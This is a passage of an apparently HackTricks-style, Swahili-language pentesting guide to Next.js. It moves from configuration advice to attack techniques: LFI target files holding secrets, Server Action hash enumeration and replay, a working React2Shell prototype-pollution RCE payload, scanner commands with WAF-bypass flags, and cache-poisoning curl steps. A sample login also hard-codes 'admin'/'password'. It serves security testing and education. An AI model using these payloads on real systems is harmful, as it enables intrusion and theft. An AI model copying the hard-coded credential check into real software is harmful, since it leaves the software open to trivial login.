#### a. Kufichua Moduli Nyeti

**Mfano wa Mpangilio Mbaya:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Tatizo:**

- **Kufichua Njia Nyeti:** Kufanya alias kwa directories nyeti na kuruhusu upatikanaji upande wa client kunaweza leak taarifa za siri.
- **Kujumuisha Siri:** Ikiwa faili nyeti zinajumuishwa kwa client, yaliyomo yake yanapatikana kupitia source maps au kwa kuchunguza client-side code.

**Jinsi washambuliaji wanavyovitumia vibaya:**

Washambuliaji wanaweza kupata au kujenga upya muundo wa directory wa application, na hivyo kupata na kutumia faili au data nyeti.

</details>

### `pages/_app.js` na `pages/_document.js`

#### **`pages/_app.js`**

**Madhumuni:** Inabadilisha component ya App ya default, ikiruhusu global state, styles, na components za layout.

**Matumizi:**

- Kuingiza CSS ya global.
- Kuongeza wrappers za layout.
- Kuunganisha maktaba za state management.

**Mfano:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Madhumuni:** Inaandika upya Document ya chaguo-msingi, ikiruhusu kubadilisha tag za `<html>` na `<body>`.

**Matumizi:**

- Kubadilisha tag za `<html>` au `<body>`.
- Kuongeza meta tags au scripti maalum.
- Kuintegrisha fonti za wahusika wa tatu.

**Mfano:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Seva ya Desturi (Hiari)

**Madhumuni:** Ingawa Next.js inakuja na seva iliyojengwa, unaweza kuunda seva ya desturi kwa matumizi ya hali ya juu kama routing ya desturi au kuunganisha na huduma za backend zilizopo.

**Kumbuka:** Kutumia seva ya desturi kunaweza kupunguza chaguzi za deployment, hasa kwenye majukwaa kama Vercel ambayo yameboreshwa kwa seva iliyojengwa ya Next.js.

**Mfano:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Mambo ya Ziada ya Miundo na Usalama

### Variables za Mazingira na Usanidi

**Madhumuni:** Kusimamia taarifa nyeti na mipangilio ya usanidi nje ya msimbo.

**Mbinu Bora:**

- **Tumia faili za `.env`:** Hifadhi variables kama API keys katika `.env.local` (hazijumuishiwi kwenye udhibiti wa toleo).
- **Fikia variables kwa usalama:** Tumia `process.env.VARIABLE_NAME` kufikia variables za mazingira.
- **Usifichue siri kwenye Client:** Hakikisha variables nyeti zinatumika upande wa server pekee.

**Mfano:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Kumbuka:** Ili kufanya variables ziwe upande wa server pekee, usizijumuishe katika `env` object au ziweke na awali `NEXT_PUBLIC_` ili zichukuliwe na client.

### Artifakti muhimu za server za kulenga kupitia LFI/download endpoints

Ukikuta path traversal au download API katika app ya Next.js, lenga artifakti zilizokusanywa ambazo leak server-side secrets na mantiki ya uthibitishaji:

- `.env` / `.env.local` kwa siri za session na sifa za mtoa huduma.
- `.next/routes-manifest.json` na `.next/build-manifest.json` kwa orodha kamili ya routes.
- `.next/server/pages/api/auth/[...nextauth].js` ili kupata configuration ya NextAuth iliyojengwa (mara nyingi ina nywila za dharura wakati `process.env` values hazijatolewa).
- `next.config.js` / `next.config.mjs` kwa kukagua rewrites, redirects na middleware routing.

### Uthibitishaji na Uidhinishaji

**Mbinu:**

- **Uthibitishaji wa Kikao (Session-Based Authentication):** Tumia cookies kusimamia vikao vya watumiaji.
- **Uthibitishaji kwa Token (Token-Based Authentication):** Tekeleza JWTs kwa uthibitishaji isiyo na state.
- **Watoa Huduma wa Nje (Third-Party Providers):** Unganisha na OAuth providers (mf., Google, GitHub) ukitumia maktaba kama `next-auth`.

**Mambo ya Usalama:**

- **Cookies Salama:** Weka vigezo `HttpOnly`, `Secure`, na `SameSite`.
- **Hash ya Nywila:** Daima fanya hash ya nywila kabla ya kuzihifadhi.
- **Uthibitishaji wa Ingizo:** Zuia mashambulizi ya injection kwa kuthibitisha na kusafisha ingizo.

**Mfano:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Uboreshaji wa Utendaji

**Mikakati:**

- **Image Optimization:** Tumia Next.js's `next/image` component kwa uboreshaji wa picha kiotomatiki.
- **Code Splitting:** Tumia dynamic imports kugawa code na kupunguza muda wa upakiaji wa mwanzo.
- **Caching:** Tekeleza mikakati ya caching kwa majibu ya API na mali za statiki.
- **Lazy Loading:** Pakia komponenti au mali tu wakati zinapohitajika.

**Mfano:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Uorodheshaji wa Next.js Server Actions (hash kwa jina la function kupitia source maps)

Next.js ya kisasa inatumia “Server Actions” ambazo zinafanyika kwenye server lakini zinaitishwa kutoka client. Katika production, miito hii ni isiyo wazi: POST zote zinaelekezwa kwenye endpoint moja ya kawaida na zinatofautishwa na hash maalum ya build inayotumwa kwenye header `Next-Action`. Mfano:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
Wakati `productionBrowserSourceMaps` imewezeshwa, minified JS chunks zina miito kwa `createServerReference(...)` ambayo leak muundo wa kutosha (pamoja na source maps zinazohusiana) ili kurejesha mapping kati ya action hash na jina la function asili. Hii inakuwezesha kutafsiri hashes zinazobonyezwa katika `Next-Action` kuwa malengo halisi kama `deleteUserAccount()` au `exportFinancialData()`.

### Mbinu ya uchimbaji (regex kwenye minified JS + optional source maps)

Tafuta JS chunks zilizopakuliwa kwa `createServerReference` na toa hash pamoja na function/source symbol. Mifumo miwili muhimu:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Kikundi 1: server action hash (40+ hex chars)
- Kikundi 2: alama au path ambayo inaweza kutatuliwa kuwa jina la asili la function kupitia source map inapokuwepo

If the script advertises a source map (trailer comment `//# sourceMappingURL=<...>.map`), fetch it and resolve the symbol/path to the original function name.

### Mtiririko wa kazi wa vitendo

- Ugunduzi wa passivu wakati wa kuvinjari: kusanya requests zenye `Next-Action` headers na JS chunk URLs.
- Chukua JS bundles zilizotajwa na faili za `*.map` zinazofuatana (zinapokuwepo).
- Endesha regex iliyotajwa juu ili kujenga dikshionari ya hash↔name.
- Tumia dikshionari kulenga testing:
- Name-driven triage (e.g., `transferFunds`, `exportFinancialData`).
- Track coverage across builds by function name (hashes rotate across builds).

### Kufanyiwa vitendo vilivyofichwa (ombi la template)

Chukua POST halali uliyoonekana in-proxy kama template na badilisha thamani ya `Next-Action` ili kulenga action nyingine uliyogundua:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Replay in Repeater and test authorization, input validation and business logic of otherwise unreachable actions.

### Burp automation

- NextjsServerActionAnalyzer (Burp extension) inatoa otomatiki yaliyo hapo juu ndani ya Burp:
- Inachambua historia ya proxy kwa JS chunks, hutoa entries za `createServerReference(...)`, na inachakata source maps inapopatikana.
- Inadumisha kamusi inayoweza kutafutwa ya hash↔function-name na huondoa nakala zinazojirudia kati ya builds kwa jina la function.
- Inaweza kupata POST ya template halali na kufungua tab ya Repeater tayari-ku-tuma na hash ya action lengwa imebadilishwa.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Notes and limitations

- Inahitaji `productionBrowserSourceMaps` iwe imewezeshwa katika production ili kurejesha majina kutoka kwa bundles/source maps.
- Kufichuliwa kwa function-name si udhaifu peke yake; itumie kuongoza ugundaji na kujaribu authorization ya kila action.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Next.js App Router deployments that expose Server Actions on `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** zina prototype pollution kali upande wa server wakati wa deserialization ya Flight chunks. Kwa kutengeneza marejeo ya `$` ndani ya payload ya Flight, mshambuliaji anaweza kupita kutoka kwa prototypes zilizochafuliwa hadi utekelezaji wa JavaScript kwa hiari kisha hadi utekelezaji wa amri za OS ndani ya mchakato wa Node.js.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Attack chain in Flight chunks

1. **Prototype pollution primitive:** Set `"then": "$1:__proto__:then"` so that the resolver writes a `then` function on `Object.prototype`. Any plain object processed afterwards becomes a thenable, letting the attacker influence async control flow inside RSC internals.
2. **Rebinding to the global `Function` constructor:** Point `_response._formData.get` at `"$1:constructor:constructor"`. During resolution, `object.constructor` → `Object`, and `Object.constructor` → `Function`, so future calls to `_formData.get()` actually execute `Function(...)`.
3. **Code execution via `_prefix`:** Place JavaScript source in `_response._prefix`. When the polluted `_formData.get` is invoked, the framework evaluates `Function(_prefix)(...)`, so the injected JS can run `require('child_process').exec()` or any other Node primitive.

#### Muundo wa payload
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### Ramani ya React Server Function exposure

React Server Functions (RSF) ni functions zozote zinazojumuisha direktivu 'use server';. Kila form action, mutation, au fetch helper iliyounganishwa na moja ya functions hizo hubadilika kuwa RSC Flight endpoint inayoweza kwa urahisi deserialize attacker-supplied payloads. Hatua za recon zinazofaa zilizotokana na React2Shell assessments:

- **Static inventory:** tafuta direktivu ili kuelewa ni RSFs ngapi zinavyoonyeshwa kiotomatiki na framework.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router defaults:** `create-next-app` inawawezesha App Router + `app/` directory kwa default, ambayo kimya kimya hubadilisha kila route kuwa endpoint inayoweza RSC. App Router assets kama `/_next/static/chunks/app/` au responses zinazotiririsha Flight chunks kupitia `text/x-component` ni strong Internet-facing fingerprints.
- **Implicitly vulnerable RSC deployments:** Taarifa ya React inabainisha kuwa apps zinazofikisha RSC runtime zinaweza kutumika exploitable **even without explicit RSFs**, hivyo chukulia build yoyote inayotumia `react-server-dom-*` 19.0.0–19.2.0 kama suspect.
- **Other frameworks bundling RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, etc. zinatumia serializer ile ile na kurithi identical remote attack surface hadi zitakapo embed patched React builds.

#### Version coverage (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **vulnerable** in 19.0.0, 19.1.0–19.1.1 and 19.2.0; **patched** in 19.0.1, 19.1.2 and 19.2.1 respectively.
- **Next.js stable:** App Router releases 15.0.0–16.0.6 zinajumuisha the vulnerable RSC stack. Patch trains 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 zimeshajumuisha fixed deps, hivyo build yoyote chini ya versions hizo ni high-value.
- **Next.js canary:** `14.3.0-canary.77+` pia inasafirisha buggy runtime na kwa sasa haina patched canary drops, ikifanya hizo fingerprints kuwa strong exploitation candidates.

#### Remote detection oracle

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) inatuma crafted multipart Flight request kwa candidate paths na inaangalia server-side behavior:

- **Default mode** inatekeleza deterministic RCE payload (math operation reflected via `X-Action-Redirect`) ikithibitisha code execution.
- **`--safe-check` mode** inadhalilisha/inaleta malformed Flight message kwa makusudi ili servers zilizo patched zirudishe `200/400`, wakati vulnerable targets zimetoa `HTTP/500` responses zenye substring `E{"digest"` ndani ya body. Pair hiyo `(500 + digest)` kwa sasa ndiyo remote oracle yenye uaminifu zaidi iliyochapishwa na defenders.
- Built-in `--waf-bypass`, `--vercel-waf-bypass`, and `--windows` switches zinafanya adjust kwa payload layout, zinaweka junk mbele, au kubadilisha OS commands ili uweze probe real Internet assets.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
### Masuala mengine ya karibuni ya App Router (mwisho wa 2025)

1. **RSC DoS & source disclosure (CVE-2025-55184 / CVE-2025-67779 / CVE-2025-55183)** – payloads za Flight zilizoharibika zinaweza kuzunguza resolver ya RSC hadi mzunguko usio na mwisho (pre-auth DoS) au kulazimisha serialization ya msimbo wa Server Function uliokompilwa kwa vitendo vingine. App Router builds ≥13.3 zimeathiriwa hadi zifanyiwe patchi; 15.0.x–16.0.x zinahitaji mistari maalum ya patchi kutoka kwenye advisory ya upstream. Tumia tena njia ya kawaida ya Server Action lakini piga mtiririko wa body `text/x-component` yenye marejeo ya `$` ya matumizi mabaya. Kwa upande wa CDN, muunganisho uliokwama unaendelea kufunguliwa kwa sababu ya timeout za cache, na hivyo kufanya DoS kuwa rahisi.

- **Kidokezo cha triage:** Malengo yasiyofanyiwa patch hurudisha `500` na `E{"digest"` baada ya payloads za Flight zilizoharibika; builds zilizofanyiwa patch hurudisha `400/200`. Jaribu endpoint yoyote inayotoshaidisha kwa kutiririsha Flight chunks (tafuta headers za `Next-Action` au majibu ya `text/x-component`) na irudie ukiwa na payload iliyobadilishwa.

2. **RSC cache poisoning (CVE-2025-49005, App Router 15.3.0–15.3.2)** – kukosekana kwa `Vary` kuliruhusu jibu la `Accept: text/x-component` kuhifadhiwa kwenye cache na kutumiwa kwa browsers zinazotarajia HTML. Ombi moja la priming linaweza kubadilisha ukurasa na kuonyesha payloads ghafi za RSC. PoC flow:
```bash
# Prime CDN with an RSC response
curl -k -H "Accept: text/x-component" "https://target/app/dashboard" > /dev/null
# Immediately fetch without Accept (victim view)
curl -k "https://target/app/dashboard" | head
```
Ikiwa jibu la pili linarudisha data za JSON za Flight badala ya HTML, route inaweza kuathiriwa na cache (poisonable). Safisha cache baada ya kujaribu.

## Marejeo

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – All You Need to Know](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)
- [Next.js Security Update: December 11, 2025 (CVE-2025-55183/55184/67779)](https://nextjs.org/blog/security-update-2025-12-11)
- [GHSA-r2fc-ccr8-96c4 / CVE-2025-49005: App Router cache poisoning](https://github.com/advisories/GHSA-r2fc-ccr8-96c4)

{{#include ../../banners/hacktricks-training.md}}
